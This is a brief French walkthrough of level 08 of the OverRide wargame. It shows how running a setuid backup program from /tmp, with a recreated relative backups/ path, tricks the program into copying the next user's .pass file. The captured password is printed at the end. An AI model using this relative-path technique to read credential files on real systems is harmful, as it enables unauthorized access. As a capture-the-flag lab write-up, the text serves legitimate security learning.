## LEVEL 08

Lorsqu'on lance le programme sans arguments, il nous donne l'usage :

```
level08@OverRide:~$ ./level08
Usage: ./level08 filename
ERROR: Failed to open (null)
```

Il faut donc ouvrir le programme avec un fichier.

On voit en analysant le binaire que celui-ci essaie de créer un backup du fichier mit en argument.

Essayons d'ouvrir le .pass du level09.
```
level08@OverRide:~$ ./level08 ~level09/.pass
ERROR: Failed to open ./backups//home/users/level09/.pass
```
Le programme essaie de créer le backup dans le path `./backups//home/users/level09/.pass`. Le problème est que celui-ci n'existe pas.

On doit alors créer le même path dans le tmp. Pour que le programme puisse y accéder il faut toujours le lancer à partir de tmp car celui-ci utilise le relative path.

```
level08@OverRide:/tmp$ mkdir -p ./backups//home/users/level09/
```
On relance le programme avec le .pass du level09 et cette fois-ci il devrait trouver un endroit où créer le backup.

```
level08@OverRide:/tmp$ ~/level08 ~level09/.pass
level08@OverRide:/tmp$ cat backups/home/users/level09/.pass
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```
